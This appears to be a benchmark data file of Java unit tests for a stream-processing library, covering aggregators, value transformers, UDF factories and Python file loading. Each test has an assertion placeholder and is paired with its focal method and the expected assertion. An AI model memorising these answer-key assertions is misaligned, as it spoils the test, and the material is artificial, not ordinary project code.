canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return fieldPath.length == 1 && isValidNonRepeatedField(fieldDescriptor) && fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.STRING; }"	"assertFalse(stringFieldHasher.canProcess(bookingDescriptor.findFieldByName(""order_number"")))"
"shouldNotSetAnyChild() { Descriptors.Descriptor bookingDescriptor = TestBookingLogMessage.getDescriptor(); String[] fieldPath = {""order_number""}; StringFieldHasher stringFieldHasher = new StringFieldHasher(fieldPath); FieldHasher fieldHasher = stringFieldHasher.setChild(bookingDescriptor.findFieldByName(""order_number""));  Assert.""<AssertPlaceHolder>""; }
setChild(Descriptors.FieldDescriptor fieldDescriptor) { return this; }"	assertEquals(stringFieldHasher, fieldHasher)
"shouldProcessNothing() { Descriptors.Descriptor timeStampDescriptor = Timestamp.getDescriptor(); String[] fieldPath = {""seconds""}; UnsupportedDataTypeHasher unsupportedDataTypeHasher = new UnsupportedDataTypeHasher(fieldPath);  Assert.""<AssertPlaceHolder>""; }
canProcess(Descriptors.FieldDescriptor fieldDescriptor) { return false; }"	"assertFalse(unsupportedDataTypeHasher.canProcess(timeStampDescriptor.findFieldByName(""seconds"")))"
"shouldMergeAccumulators() { CollectArray collectArray = new CollectArray(); ArrayAccumulator arrayAccumulator1 = new ArrayAccumulator(); collectArray.accumulate(arrayAccumulator1, ""value1""); collectArray.accumulate(arrayAccumulator1, ""value2""); collectArray.accumulate(arrayAccumulator1, ""value3"");  ArrayAccumulator arrayAccumulator2 = new ArrayAccumulator(); ArrayAccumulator arrayAccumulator3 = new ArrayAccumulator();  arrayAccumulator2.add(""value4""); arrayAccumulator2.add(""value5""); arrayAccumulator3.add(""value6""); arrayAccumulator3.add(""value7"");  ArrayList<ArrayAccumulator> iterable = new ArrayList<>(); iterable.add(arrayAccumulator2); iterable.add(arrayAccumulator3);  collectArray.merge(arrayAccumulator1, iterable);  List<Object> result = collectArray.getValue(arrayAccumulator1); ""<AssertPlaceHolder>""; }
getValue(ArrayAccumulator arrayAccumulator) { return arrayAccumulator.emit(); }"	"assertEquals(Arrays.asList(""value1"", ""value2"", ""value3"", ""value4"", ""value5"", ""value6"", ""value7""), result)"
"shouldNotChangeAccumulatorIfIterableIsEmptyOnMerge() { CollectArray collectArray = new CollectArray(); ArrayAccumulator arrayAccumulator = new ArrayAccumulator(); collectArray.accumulate(arrayAccumulator, ""value1""); collectArray.accumulate(arrayAccumulator, ""value2""); collectArray.accumulate(arrayAccumulator, ""value3"");   ArrayList<ArrayAccumulator> iterable = new ArrayList<>(); iterable.add(new ArrayAccumulator());  collectArray.merge(arrayAccumulator, iterable);  List<Object> result = collectArray.getValue(arrayAccumulator); ""<AssertPlaceHolder>""; }
getValue(ArrayAccumulator arrayAccumulator) { return arrayAccumulator.emit(); }"	"assertEquals(Arrays.asList(""value1"", ""value2"", ""value3""), result)"
"shouldNotAddItemIfItAlreadyExistsInDistinctItems() { DistinctCountAccumulator distinctCountAccumulator = new DistinctCountAccumulator(); DistinctCount distinctCount = new DistinctCount(); distinctCount.accumulate(distinctCountAccumulator, ""1234""); distinctCount.accumulate(distinctCountAccumulator, ""1234""); distinctCount.accumulate(distinctCountAccumulator, ""1233""); ""<AssertPlaceHolder>""; }
getValue(DistinctCountAccumulator distinctCountAccumulator) { return distinctCountAccumulator.count(); }"	assertEquals(Integer.valueOf(2), distinctCount.getValue(distinctCountAccumulator))
"shouldNotAddNull() { DistinctCountAccumulator distinctCountAccumulator = new DistinctCountAccumulator(); DistinctCount distinctCount = new DistinctCount(); distinctCount.accumulate(distinctCountAccumulator, null); ""<AssertPlaceHolder>""; }
getValue(DistinctCountAccumulator distinctCountAccumulator) { return distinctCountAccumulator.count(); }"	assertEquals(Integer.valueOf(0), distinctCount.getValue(distinctCountAccumulator))
"shouldMergeAccumulators() { DistinctCount distinctCount = new DistinctCount(); DistinctCountAccumulator distinctCountAccumulator1 = new DistinctCountAccumulator(); distinctCount.accumulate(distinctCountAccumulator1, ""1""); distinctCount.accumulate(distinctCountAccumulator1, ""2""); distinctCount.accumulate(distinctCountAccumulator1, ""3"");  DistinctCountAccumulator distinctCountAccumulator2 = new DistinctCountAccumulator(); DistinctCountAccumulator distinctCountAccumulator3 = new DistinctCountAccumulator(); distinctCountAccumulator2.add(""4""); distinctCountAccumulator2.add(""5""); distinctCountAccumulator3.add(""6""); distinctCountAccumulator3.add(""7"");  ArrayList<DistinctCountAccumulator> iterable = new ArrayList<>(); iterable.add(distinctCountAccumulator2); iterable.add(distinctCountAccumulator3);  distinctCount.merge(distinctCountAccumulator1, iterable);  int result = distinctCount.getValue(distinctCountAccumulator1); ""<AssertPlaceHolder>""; }
getValue(DistinctCountAccumulator distinctCountAccumulator) { return distinctCountAccumulator.count(); }"	assertEquals(7, result)
"shouldNotChangeAccumulatorIfIterableIsEmptyOnMerge() { DistinctCount distinctCount = new DistinctCount(); DistinctCountAccumulator distinctCountAccumulator = new DistinctCountAccumulator(); distinctCount.accumulate(distinctCountAccumulator, ""1""); distinctCount.accumulate(distinctCountAccumulator, ""2""); distinctCount.accumulate(distinctCountAccumulator, ""3"");  DistinctCountAccumulator distinctCountAccumulator2 = new DistinctCountAccumulator(); DistinctCountAccumulator distinctCountAccumulator3 = new DistinctCountAccumulator();  ArrayList<DistinctCountAccumulator> iterable = new ArrayList<>(); iterable.add(distinctCountAccumulator2); iterable.add(distinctCountAccumulator3);  distinctCount.merge(distinctCountAccumulator, iterable);  int result = distinctCount.getValue(distinctCountAccumulator); ""<AssertPlaceHolder>""; }
getValue(DistinctCountAccumulator distinctCountAccumulator) { return distinctCountAccumulator.count(); }"	assertEquals(3, result)
"shouldMergeAccumulators() { Features features = new Features(); FeatureAccumulator featureAccumulator1 = new FeatureAccumulator(); features.accumulate(featureAccumulator1, ""key1"", ""value1""); features.accumulate(featureAccumulator1, ""key2"", ""value2""); features.accumulate(featureAccumulator1, ""key3"", ""value3"");  FeatureAccumulator featureAccumulator2 = new FeatureAccumulator(); FeatureAccumulator featureAccumulator3 = new FeatureAccumulator(); featureAccumulator2.add(""key4"", ""value4""); featureAccumulator2.add(""key5"", ""value5""); featureAccumulator3.add(""key6"", ""value6""); featureAccumulator3.add(""key7"", ""value7"");  ArrayList<FeatureAccumulator> iterable = new ArrayList<>(); iterable.add(featureAccumulator2); iterable.add(featureAccumulator3);  features.merge(featureAccumulator1, iterable);  Row row1 = new Row(3); Row row2 = new Row(3); Row row3 = new Row(3); Row row4 = new Row(3); Row row5 = new Row(3); Row row6 = new Row(3); Row row7 = new Row(3);  Row[] expectedRows = new Row[]{row1, row2, row3, row4, row5, row6, row7}; expectedRows[0].setField(0, ""key1""); expectedRows[0].setField(2, ""key1""); expectedRows[1].setField(0, ""key2""); expectedRows[1].setField(2, ""key2""); expectedRows[2].setField(0, ""key3""); expectedRows[2].setField(2, ""key3""); expectedRows[3].setField(0, ""key4""); expectedRows[3].setField(2, ""key4""); expectedRows[4].setField(0, ""key5""); expectedRows[4].setField(2, ""key5""); expectedRows[5].setField(0, ""key6""); expectedRows[5].setField(2, ""key6""); expectedRows[6].setField(0, ""key7""); expectedRows[6].setField(2, ""key7""); Row nestedRow1 = new Row(8); Row nestedRow2 = new Row(8); Row nestedRow3 = new Row(8); Row nestedRow4 = new Row(8); Row nestedRow5 = new Row(8); Row nestedRow6 = new Row(8); Row nestedRow7 = new Row(8); nestedRow1.setField(1, ""value1""); nestedRow2.setField(1, ""value2""); nestedRow3.setField(1, ""value3""); nestedRow4.setField(1, ""value4""); nestedRow5.setField(1, ""value5""); nestedRow6.setField(1, ""value6""); nestedRow7.setField(1, ""value7""); expectedRows[0].setField(1, nestedRow1); expectedRows[1].setField(1, nestedRow2); expectedRows[2].setField(1, nestedRow3); expectedRows[3].setField(1, nestedRow4); expectedRows[4].setField(1, nestedRow5); expectedRows[5].setField(1, nestedRow6); expectedRows[6].setField(1, nestedRow7);  Row[] result = features.getValue(featureAccumulator1); ""<AssertPlaceHolder>""; }
getValue(FeatureAccumulator featureAccumulator) { return featureAccumulator.getFeaturesAsRows(); }"	assertArrayEquals(expectedRows, result)
"shouldNotChangeAccumulatorIfIterableIsEmptyOnMerge() { Features features = new Features(); FeatureAccumulator featureAccumulator1 = new FeatureAccumulator(); features.accumulate(featureAccumulator1, ""key1"", ""value1""); features.accumulate(featureAccumulator1, ""key2"", ""value2""); features.accumulate(featureAccumulator1, ""key3"", ""value3"");  FeatureAccumulator featureAccumulator2 = new FeatureAccumulator(); FeatureAccumulator featureAccumulator3 = new FeatureAccumulator();  ArrayList<FeatureAccumulator> iterable = new ArrayList<>(); iterable.add(featureAccumulator2); iterable.add(featureAccumulator3);  features.merge(featureAccumulator1, iterable);  Row row1 = new Row(3); Row row2 = new Row(3); Row row3 = new Row(3);  Row[] expectedRows = new Row[]{row1, row2, row3}; expectedRows[0].setField(0, ""key1""); expectedRows[0].setField(2, ""key1""); expectedRows[1].setField(0, ""key2""); expectedRows[1].setField(2, ""key2""); expectedRows[2].setField(0, ""key3""); expectedRows[2].setField(2, ""key3""); Row nestedRow1 = new Row(8); Row nestedRow2 = new Row(8); Row nestedRow3 = new Row(8); nestedRow1.setField(1, ""value1""); nestedRow2.setField(1, ""value2""); nestedRow3.setField(1, ""value3""); expectedRows[0].setField(1, nestedRow1); expectedRows[1].setField(1, nestedRow2); expectedRows[2].setField(1, nestedRow3);  Row[] result = features.getValue(featureAccumulator1); ""<AssertPlaceHolder>""; }
getValue(FeatureAccumulator featureAccumulator) { return featureAccumulator.getFeaturesAsRows(); }"	assertArrayEquals(expectedRows, result)
"shouldReturn90Percentile() { PercentileAggregator pa = new PercentileAggregator(); PercentileAccumulator acc = pa.createAccumulator(); for (int i = 1; i <= 1000; i++) { acc.add(90, i); } Assert.""<AssertPlaceHolder>""; }
getValue(PercentileAccumulator acc) { return acc.getPercentileValue(); }"	assertEquals(900, pa.getValue(acc), 1)
"shouldMergeAccumulators() { PercentileAggregator percentileAggregator = new PercentileAggregator(); PercentileAccumulator percentileAccumulator1 = new PercentileAccumulator(); percentileAggregator.accumulate(percentileAccumulator1, valueOf(90D), valueOf(1D)); percentileAggregator.accumulate(percentileAccumulator1, valueOf(90D), valueOf(2D)); percentileAggregator.accumulate(percentileAccumulator1, valueOf(90D), valueOf(3D));  PercentileAccumulator percentileAccumulator2 = new PercentileAccumulator(); PercentileAccumulator percentileAccumulator3 = new PercentileAccumulator(); percentileAccumulator2.add(90D, 4D); percentileAccumulator2.add(90D, 5D); percentileAccumulator3.add(90D, 6D); percentileAccumulator3.add(90D, 7D);   ArrayList<PercentileAccumulator> iterable = new ArrayList<>(); iterable.add(percentileAccumulator2); iterable.add(percentileAccumulator3);  percentileAggregator.merge(percentileAccumulator1, iterable);  double result = percentileAggregator.getValue(percentileAccumulator1); ""<AssertPlaceHolder>""; }
getValue(PercentileAccumulator acc) { return acc.getPercentileValue(); }"	assertEquals(7D, result, 0D)
"shouldNotChangeAccumulatorIfIterableIsEmptyOnMerge() { PercentileAggregator percentileAggregator = new PercentileAggregator(); PercentileAccumulator percentileAccumulator = new PercentileAccumulator(); percentileAggregator.accumulate(percentileAccumulator, valueOf(90D), valueOf(1D)); percentileAggregator.accumulate(percentileAccumulator, valueOf(90D), valueOf(2D)); percentileAggregator.accumulate(percentileAccumulator, valueOf(90D), valueOf(3D));  ArrayList<PercentileAccumulator> iterable = new ArrayList<>();  percentileAggregator.merge(percentileAccumulator, iterable);  double result = percentileAggregator.getValue(percentileAccumulator); ""<AssertPlaceHolder>""; }
getValue(PercentileAccumulator acc) { return acc.getPercentileValue(); }"	assertEquals(3D, result, 0D)
"shouldGiveDistinctCount() { DistinctCountAccumulator accumulator = new DistinctCountAccumulator(); accumulator.add(""First""); accumulator.add(""Second""); accumulator.add(""First""); accumulator.add(""Third""); accumulator.add(""Second"");  ""<AssertPlaceHolder>""; }
count() { return distinctItems.size(); }"	assertEquals(accumulator.count(), 3)
"ClassNotFoundException { DistinctCountAccumulator accumulator = new DistinctCountAccumulator(); accumulator.add(""First""); accumulator.add(""Second""); accumulator.add(""First"");  ByteArrayOutputStream serializedAccumulatorStream = new ByteArrayOutputStream(); new ObjectOutputStream(serializedAccumulatorStream).writeObject(accumulator);  ObjectInputStream deserializedAccStream = new ObjectInputStream(new ByteArrayInputStream(serializedAccumulatorStream.toByteArray()));  DistinctCountAccumulator deserializedAccumulator = (DistinctCountAccumulator) deserializedAccStream.readObject();  ""<AssertPlaceHolder>""; }
count() { return distinctItems.size(); }"	assertEquals(deserializedAccumulator.count(), accumulator.count())
"ClassNotFoundException { FeatureAccumulator featureAccumulator = new FeatureAccumulator(); featureAccumulator.add(""key1"", ""value1""); featureAccumulator.add(""key2"", ""value2""); featureAccumulator.add(""key3"", ""value3"");  ByteArrayOutputStream serializedAccumulatorStream = new ByteArrayOutputStream(); new ObjectOutputStream(serializedAccumulatorStream).writeObject(featureAccumulator);  ObjectInputStream deserializedAccStream = new ObjectInputStream(new ByteArrayInputStream(serializedAccumulatorStream.toByteArray()));  FeatureAccumulator deserializedAccumulator = (FeatureAccumulator) deserializedAccStream.readObject();  ""<AssertPlaceHolder>""; }
getFeaturesAsRows() { ArrayList<Row> featureRows = new ArrayList<>(); for (Tuple2<String, Object> feature : features) { String key = feature.f0; Object value = feature.f1; FeatureUtils.populateFeatures(featureRows, key, value, FEATURE_ROW_LENGTH); } return featureRows.toArray(new Row[0]); }"	assertArrayEquals(featureAccumulator.getFeaturesAsRows(), deserializedAccumulator.getFeaturesAsRows())
"ClassNotFoundException { FeatureWithTypeAccumulator featureAccumulator = new FeatureWithTypeAccumulator(); featureAccumulator.add(""key1"", ""value1"", ValueEnum.StringType); featureAccumulator.add(""key2"", ""value2"", ValueEnum.StringType); featureAccumulator.add(""key3"", ""value3"", ValueEnum.StringType); ByteArrayOutputStream serializedAccumulatorStream = new ByteArrayOutputStream(); new ObjectOutputStream(serializedAccumulatorStream).writeObject(featureAccumulator); ObjectInputStream deserializedAccStream = new ObjectInputStream(new ByteArrayInputStream(serializedAccumulatorStream.toByteArray()));  FeatureWithTypeAccumulator deserializedAccumulator = (FeatureWithTypeAccumulator) deserializedAccStream.readObject();  ""<AssertPlaceHolder>""; }
getFeaturesAsRows() { ArrayList<Row> featureRows = new ArrayList<>(); for (Tuple2<String, Object> feature : features) { String key = feature.f0; Object value = feature.f1; FeatureUtils.populateFeatures(featureRows, key, value, FEATURE_ROW_LENGTH); } return featureRows.toArray(new Row[0]); }"	assertArrayEquals(featureAccumulator.getFeaturesAsRows(), deserializedAccumulator.getFeaturesAsRows())
"shouldReturn90thPercentileValue() { PercentileAccumulator accumulator = new PercentileAccumulator(); accumulator.add(90, 10); accumulator.add(90, 30); accumulator.add(90, 40); accumulator.add(90, 20); accumulator.add(90, 70); accumulator.add(90, 90); accumulator.add(90, 100); accumulator.add(90, 80); accumulator.add(90, 50); accumulator.add(90, 60); Assert.""<AssertPlaceHolder>""; }
getPercentileValue() { return new Percentile(this.percentile). evaluate(dValueList.stream().sorted().mapToDouble(Double::doubleValue).toArray(), 0, dValueList.size()); }"	assertEquals(99.0, accumulator.getPercentileValue(), 0.001)
"shouldReturnTrueForBigDecimalValues() { BigDecimalValueTransformer bigDecimalValueTransformer = new BigDecimalValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof BigDecimal; }"	assertEquals(bigDecimalValueTransformer.canTransform(new BigDecimal(123)), true)
"shouldReturnTrueForBooleanValues() { BooleanValueTransformer booleanValueHandler = new BooleanValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof Boolean; }"	assertEquals(booleanValueHandler.canTransform(true), true)
"shouldReturnTrueForByteValues() { ByteValueTransformer byteValueHandler = new ByteValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof ByteString; }"	"assertEquals(byteValueHandler.canTransform(ByteString.copyFrom(""value1"".getBytes())), true)"
"shouldReturnTrueForDoubleValues() { DoubleValueTransformer doubleValueHandler = new DoubleValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof Double; }"	assertEquals(doubleValueHandler.canTransform(2.00D), true)
"shouldReturnTrueForFloatValues() { FloatValueTransformer floatValueHandler = new FloatValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof Float; }"	assertEquals(floatValueHandler.canTransform(2.0F), true)
"shouldReturnTrueForLongValues() { LongValueTransformer longValueHandler = new LongValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof Long; }"	assertEquals(longValueHandler.canTransform(1L), true)
"shouldReturnTrueForNullValues() { NullValueTransformer nullValueTransformer = new NullValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return null == value; }"	assertEquals(nullValueTransformer.canTransform(null), true)
"shouldReturnFalseIfRowArityIsNotTwo() { Row row = new Row(1); TimestampValueTransformer timestampValueHandler = new TimestampValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof Row && ((Row) value).getArity() == 2; }"	assertEquals(false, timestampValueHandler.canTransform(row))
"shouldReturnFalseIfRowIsNotPassed() { TimestampValueTransformer timestampValueHandler = new TimestampValueTransformer(); ""<AssertPlaceHolder>""; }
canTransform(Object value) { return value instanceof Row && ((Row) value).getArity() == 2; }"	assertEquals(false, timestampValueHandler.canTransform(null))
"shouldReturnScalarUdfs() { FunctionFactory functionFactory = new FunctionFactory(streamTableEnvironment, configuration); HashSet<ScalarUdf> scalarUdfs = functionFactory.getScalarUdfs(); Assert.""<AssertPlaceHolder>""; }
getScalarUdfs() { HashSet<ScalarUdf> scalarUdfs = new HashSet<>(); scalarUdfs.add(DartContains.withGcsDataStore(getGcsProjectId(), getGcsBucketId())); scalarUdfs.add(DartGet.withGcsDataStore(getGcsProjectId(), getGcsBucketId())); scalarUdfs.add(new Distance()); scalarUdfs.add(new ElementAt(getProtosInInputStreams(), stencilClientOrchestrator)); scalarUdfs.add(new EndOfMonth()); scalarUdfs.add(new EndOfWeek()); scalarUdfs.add(new ExponentialMovingAverage()); scalarUdfs.add(new FormatTimeInZone()); scalarUdfs.add(new GeoHash()); scalarUdfs.add(new LinearTrend()); scalarUdfs.add(new ListContains()); scalarUdfs.add(new MapGet()); scalarUdfs.add(new S2AreaInKm2()); scalarUdfs.add(new S2Id()); scalarUdfs.add(new SingleFeatureWithType()); scalarUdfs.add(new Split()); scalarUdfs.add(new StartOfMonth()); scalarUdfs.add(new StartOfWeek()); scalarUdfs.add(new TimeInDate()); scalarUdfs.add(new TimestampFromUnix()); scalarUdfs.add(new CondEq()); scalarUdfs.add(new Filters(stencilClientOrchestrator)); scalarUdfs.add(new SelectFields(stencilClientOrchestrator)); scalarUdfs.add(new ArrayAggregate()); scalarUdfs.add(new ArrayOperate()); scalarUdfs.add(new ByteToString()); scalarUdfs.add(new JsonQuery()); scalarUdfs.add(new JsonUpdate()); scalarUdfs.add(new JsonDelete()); return scalarUdfs; }"	assertTrue(scalarUdfs.stream().anyMatch(scalarUdf -> scalarUdf.getClass() == EndOfMonth.class))
"shouldReturnTableUdfs() { FunctionFactory functionFactory = new FunctionFactory(streamTableEnvironment, configuration); HashSet<TableUdf> tableUdfs = functionFactory.getTableUdfs(); Assert.""<AssertPlaceHolder>""; }
getTableUdfs() { HashSet<TableUdf> tableUdfs = new HashSet<>(); tableUdfs.add(new HistogramBucket()); tableUdfs.add(new OutlierMad()); return tableUdfs; }"	assertTrue(tableUdfs.stream().anyMatch(tableUdf -> tableUdf.getClass() == HistogramBucket.class))
"shouldReturnAggregateUdfs() { FunctionFactory functionFactory = new FunctionFactory(streamTableEnvironment, configuration); HashSet<AggregateUdf> aggregateUdfs = functionFactory.getAggregateUdfs(); Assert.""<AssertPlaceHolder>""; }
getAggregateUdfs() { HashSet<AggregateUdf> aggregateUdfs = new HashSet<>(); aggregateUdfs.add(new CollectArray()); aggregateUdfs.add(new DistinctCount()); aggregateUdfs.add(new Features()); aggregateUdfs.add(new FeaturesWithType()); aggregateUdfs.add(new PercentileAggregator()); return aggregateUdfs; }"	assertTrue(aggregateUdfs.stream().anyMatch(aggregateUdf -> aggregateUdf.getClass() == DistinctCount.class))
"shouldRemoveWhitespaceInPythonFilesConfig() { String pythonJsonConfig = ""{ ""PYTHON_FILES"": ""   /path/to/function.zip,   /path/to/files/test.py  ""}"";  when(configuration.getString(Constants.PYTHON_UDF_CONFIG, """")).thenReturn(pythonJsonConfig); PythonUdfConfig pythonUdfConfig = PythonUdfConfig.parse(configuration);  Assert.""<AssertPlaceHolder>""; }
getPythonFiles() { if (pythonFiles != null) { return pythonFiles.replaceAll(""\\s+"", """"); } return null; }"	"assertEquals(pythonUdfConfig.getPythonFiles(), ""/path/to/function.zip,/path/to/files/test.py"")"
"shouldRemoveWhitespaceInPythonArchivesConfig() { String pythonJsonConfig = ""{ ""PYTHON_FILES"": ""/path/to/function.zip"", ""PYTHON_ARCHIVES"": ""   /path/to/data.zip,   /path/to/files/second_data.zip  ""}"";  when(configuration.getString(Constants.PYTHON_UDF_CONFIG, """")).thenReturn(pythonJsonConfig); PythonUdfConfig pythonUdfConfig = PythonUdfConfig.parse(configuration);  Assert.""<AssertPlaceHolder>""; }
getPythonArchives() { if (pythonArchives != null) { return pythonArchives.replaceAll(""\\s+"", """"); } return null; }"	"assertEquals(pythonUdfConfig.getPythonArchives(), ""/path/to/data.zip,/path/to/files/second_data.zip"")"
"shouldGetLocalFileSource() { String pythonFile = ""/path/to/file/test_function.py"";  FileSource fileSource = FileSourceFactory.getFileSource(pythonFile);  Assert.""<AssertPlaceHolder>""; }
getFileSource(String pythonFile) { if (""GS"".equals(getFileSourcePrefix(pythonFile))) { return new GcsFileSource(pythonFile); } else { return new LocalFileSource(pythonFile); } }"	assertTrue(fileSource instanceof LocalFileSource)
"shouldGetGcsFileSource() { String pythonFile = ""gs://bucket-name/path/to/file/test_function.py"";  FileSource fileSource = FileSourceFactory.getFileSource(pythonFile);  Assert.""<AssertPlaceHolder>""; }
getFileSource(String pythonFile) { if (""GS"".equals(getFileSourcePrefix(pythonFile))) { return new GcsFileSource(pythonFile); } else { return new LocalFileSource(pythonFile); } }"	assertTrue(fileSource instanceof GcsFileSource)
"shouldGetObjectFile() {  String pythonFile = ""gs://bucket_name/path/to/file/python_udf.zip""; String bucketName = ""bucket_name""; String objectName = ""path/to/file/python_udf.zip""; String expectedValue = Arrays.toString(""objectFile"".getBytes());  when(storage.get(BlobId.of(bucketName, objectName))).thenReturn(blob); when(blob.getContent()).thenReturn(""objectFile"".getBytes());  GcsClient gcsClient = new GcsClient(storage); byte[] actualValue = gcsClient.getFile(pythonFile);  verify(storage, times(1)).get(BlobId.of(bucketName, objectName)); verify(blob, times(1)).getContent(); Assert.""<AssertPlaceHolder>""; }
getFile(String pythonFile) { List<String> file = Arrays.asList(pythonFile.replace(""gs://"", """").split(""/""));  String bucketName = file.get(0); String objectName = file.stream().skip(1).collect(Collectors.joining(""/""));  Blob blob = storage.get(BlobId.of(bucketName, objectName));  return blob.getContent(); }"	assertEquals(expectedValue, Arrays.toString(actualValue))
"IOException { ClassLoader classLoader = getClass().getClassLoader(); String pythonFile = classLoader.getResource(""python_udf.zip"").getFile(); byte[] expectedObject = Files.readAllBytes(Paths.get(pythonFile));  when(gcsClient.getFile(pythonFile)).thenReturn(expectedObject); GcsFileSource gcsFileSource = new GcsFileSource(pythonFile, gcsClient);  byte[] actualObject = gcsFileSource.getObjectFile();  Assert.""<AssertPlaceHolder>""; }
getObjectFile() { return getGcsClient().getFile(pythonFile); }"	assertEquals(expectedObject, actualObject)
"IOException { ClassLoader classLoader = getClass().getClassLoader();  String pythonFile = classLoader.getResource(""python_udf.zip"").getPath();  byte[] object = Files.readAllBytes(Paths.get(pythonFile)); String stringObject = new String(object, StandardCharsets.UTF_8);  LocalFileSource localFileSource = new LocalFileSource(pythonFile); byte[] actualObject = localFileSource.getObjectFile();  String actualStringObject = new String(actualObject, StandardCharsets.UTF_8); Assert.""<AssertPlaceHolder>""; }
getObjectFile() throws IOException { return Files.readAllBytes(Paths.get(pythonFile)); }"	assertEquals(stringObject, actualStringObject)
"shouldGetPythonFileType() { String pythonFile = ""/path/to/file/test_udf.py"";  FileType fileType = FileTypeFactory.getFileType(pythonFile);  Assert.""<AssertPlaceHolder>""; }
getFileType(String pythonFile) { FileSource fileSource = FileSourceFactory.getFileSource(pythonFile); switch (getFileTypeFormat(pythonFile)) { case ""PY"": return new PythonFileType(pythonFile); case ""ZIP"": return new ZipFileType(fileSource); default: throw new PythonFilesFormatException(""Python files should be in .py or .zip format""); } }"	assertTrue(fileType instanceof PythonFileType)
"shouldGetZipFileType() { String pythonFile = ""/path/to/file/python_udf.zip"";  FileType fileType = FileTypeFactory.getFileType(pythonFile);  Assert.""<AssertPlaceHolder>""; }
getFileType(String pythonFile) { FileSource fileSource = FileSourceFactory.getFileSource(pythonFile); switch (getFileTypeFormat(pythonFile)) { case ""PY"": return new PythonFileType(pythonFile); case ""ZIP"": return new ZipFileType(fileSource); default: throw new PythonFilesFormatException(""Python files should be in .py or .zip format""); } }"	assertTrue(fileType instanceof ZipFileType)
"shouldGetFileNames() { ClassLoader classLoader = getClass().getClassLoader(); String pythonFile = classLoader.getResource(""test_udf.py"").getPath();  PythonFileType pythonFileType = new PythonFileType(pythonFile); List<String> fileNames = pythonFileType.getFileNames();  Assert.""<AssertPlaceHolder>""; }
getFileNames() { if (pythonFile == null) { throw new PythonFilesEmptyException(""Python files can not be null""); } String name = pythonFile.substring(pythonFile.lastIndexOf('/') + 1);  return Collections.singletonList(name); }"	"assertEquals(""[test_udf.py]"", fileNames.toString())"
"shouldGetEmptyFileNamesIfPythonFilesIsEmpty() { String pythonFile = """";  PythonFileType pythonFileType = new PythonFileType(pythonFile); List<String> fileNames = pythonFileType.getFileNames();  Assert.""<AssertPlaceHolder>""; }
getFileNames() { if (pythonFile == null) { throw new PythonFilesEmptyException(""Python files can not be null""); } String name = pythonFile.substring(pythonFile.lastIndexOf('/') + 1);  return Collections.singletonList(name); }"	"assertEquals(""[]"", fileNames.toString())"
"IOException {  when(localFileSource.getObjectFile()).thenReturn(zipInBytes);  ZipFileType zipFileType = new ZipFileType(localFileSource); List<String> fileNames = zipFileType.getFileNames();  Assert.""<AssertPlaceHolder>""; }
getFileNames() throws IOException { byte[] object = fileSource.getObjectFile();  ZipInputStream zi = new ZipInputStream(new ByteArrayInputStream(object)); ZipEntry zipEntry; List<ZipEntry> entries = new ArrayList<>(); while ((zipEntry = zi.getNextEntry()) != null) { entries.add(zipEntry); }  List<String> fileNames = new ArrayList<>(); for (ZipEntry entry : entries) { String name = entry.getName(); if (isPythonFile(name)) { fileNames.add(name); } } return fileNames; }"	"assertEquals(""[python_udf/scalar/add.py, python_udf/vectorized/substract.py]"", fileNames.toString())"
"IOException {  when(gcsFileSource.getObjectFile()).thenReturn(zipInBytes);  ZipFileType zipFileType = new ZipFileType(gcsFileSource); List<String> fileNames = zipFileType.getFileNames();  Assert.""<AssertPlaceHolder>""; }
getFileNames() throws IOException { byte[] object = fileSource.getObjectFile();  ZipInputStream zi = new ZipInputStream(new ByteArrayInputStream(object)); ZipEntry zipEntry; List<ZipEntry> entries = new ArrayList<>(); while ((zipEntry = zi.getNextEntry()) != null) { entries.add(zipEntry); }  List<String> fileNames = new ArrayList<>(); for (ZipEntry entry : entries) { String name = entry.getName(); if (isPythonFile(name)) { fileNames.add(name); } } return fileNames; }"	"assertEquals(""[python_udf/scalar/add.py, python_udf/vectorized/substract.py]"", fileNames.toString())"
"IOException {  ClassLoader classLoader = getClass().getClassLoader(); File file = new File(Objects.requireNonNull(classLoader.getResource(""test_no_py.zip"")).getFile()); zipInBytes = Files.readAllBytes(file.toPath());  when(gcsFileSource.getObjectFile()).thenReturn(zipInBytes);  ZipFileType zipFileType = new ZipFileType(gcsFileSource); List<String> fileNames = zipFileType.getFileNames();  Assert.""<AssertPlaceHolder>""; }
getFileNames() throws IOException { byte[] object = fileSource.getObjectFile();  ZipInputStream zi = new ZipInputStream(new ByteArrayInputStream(object)); ZipEntry zipEntry; List<ZipEntry> entries = new ArrayList<>(); while ((zipEntry = zi.getNextEntry()) != null) { entries.add(zipEntry); }  List<String> fileNames = new ArrayList<>(); for (ZipEntry entry : entries) { String name = entry.getName(); if (isPythonFile(name)) { fileNames.add(name); } } return fileNames; }"	"assertEquals(""[]"", fileNames.toString())"
"Exception { Object[] objects = new Object[3]; objects[0] = 1; objects[1] = 2; objects[2] = 3; ArrayAggregate arrayAggregate = new ArrayAggregate(); arrayAggregate.open(functionContext); Object result = arrayAggregate.eval(objects, ""average"", ""Integer""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType longbowArrayType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(longbowArrayType, arrayElements); return arrayProcessor.process(); }"	assertEquals(result, 2d)
"Exception { Object[] objects = new Object[3]; objects[0] = 1.3d; objects[1] = 2.3d; objects[2] = 3.3d; ArrayAggregate arrayAggregate = new ArrayAggregate(); arrayAggregate.open(functionContext); Object result = arrayAggregate.eval(objects, ""average"", ""double""); ""<AssertPlaceHolder>""; }
eval(Object[] arrayElements, String operationType, String inputDataType) { expression.createExpression(operationType); LongbowArrayType longbowArrayType = LongbowArrayType.getDataType(inputDataType); arrayProcessor.initJexl(longbowArrayType, arrayElements); return arrayProcessor.process(); }"	assertEquals(result, 2.3d)
